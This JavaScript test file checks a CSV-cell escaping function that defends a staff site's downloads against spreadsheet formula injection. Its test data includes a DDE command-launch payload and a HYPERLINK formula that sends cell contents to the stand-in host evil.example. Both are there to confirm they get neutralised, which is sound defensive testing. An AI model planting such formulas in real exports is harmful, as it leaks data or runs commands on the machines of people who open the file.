// The cells of a downloaded CSV file (ui/dom.js csvCell, used by downloadCSV for every "Download" button of the staff site).
// A cell that starts with = + - @ can be a FORMULA when the file is opened in Excel or Google Sheets, and the Aaj ki List download
// holds free text that colleagues (and the Google Sheet) type: names, phone numbers, details, notes. All names here are made up.
import { test } from 'node:test';
import assert from 'node:assert/strict';

const { csvCell } = await import('../web/js/ui/dom.js');

test('csv: a cell that would be read as a formula gets a leading apostrophe (shown as text)', () => {
  assert.equal(csvCell('=1+1'), "'=1+1");
  assert.equal(csvCell('@SUM(A1:A9)'), "'@SUM(A1:A9)");
  assert.equal(csvCell("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0");
  assert.equal(csvCell('-HYPERLINK(1)'), "'-HYPERLINK(1)");
  assert.equal(csvCell('+SUM(1;2)'), "'+SUM(1;2)", 'a plus sign followed by a function is a formula too');
  assert.equal(csvCell('\t=1'), "'\t=1");
  assert.equal(csvCell('\r=1'), '"\'\r=1"', 'a carriage return needs the cell in quotes as well');
});

test('csv: the formula that sends a list out by link is neutralised and still a valid quoted cell', () => {
  const evil = '=HYPERLINK("https://evil.example/?d="&K2&L2,"Open")';
  const cell = csvCell(evil);
  assert.equal(cell, '"\'=HYPERLINK(""https://evil.example/?d=""&K2&L2,""Open"")"');
  // read back the way a spreadsheet reads a quoted CSV cell: it is the text with an apostrophe in front, not a formula
  const back = cell.slice(1, -1).replace(/""/g, '"');
  assert.equal(back, `'${evil}`);
  assert.ok(!back.startsWith('='));
});

test('csv: numbers, phone numbers and ordinary text are left as they are', () => {
  assert.equal(csvCell('+92 300 5550142'), '+92 300 5550142');
  assert.equal(csvCell('0300-5550142'), '0300-5550142');
  assert.equal(csvCell('(021) 555-0142'), '(021) 555-0142');
  assert.equal(csvCell(-5), '-5');
  assert.equal(csvCell('-'), '-');
  assert.equal(csvCell('+'), '+');
  assert.equal(csvCell('-2.5'), '-2.5');
  assert.equal(csvCell(0), '0');
  assert.equal(csvCell(1234.5), '1234.5');
  assert.equal(csvCell('a=b'), 'a=b', 'an equals sign inside the text is nothing');
  assert.equal(csvCell('Sample Person'), 'Sample Person');
  assert.equal(csvCell('2026-10-09'), '2026-10-09');
});

test('csv: empty values, objects, commas, quotes and line breaks', () => {
  assert.equal(csvCell(null), '');
  assert.equal(csvCell(undefined), '');
  assert.equal(csvCell(''), '');
  assert.equal(csvCell({ a: 1 }), '"{""a"":1}"');
  assert.equal(csvCell('a,b'), '"a,b"');
  assert.equal(csvCell('say "hi"'), '"say ""hi"""');
  assert.equal(csvCell('two\nlines'), '"two\nlines"');
  assert.equal(csvCell('-1,500'), '"-1,500"', 'a signed amount with a comma is quoted, not changed');
});
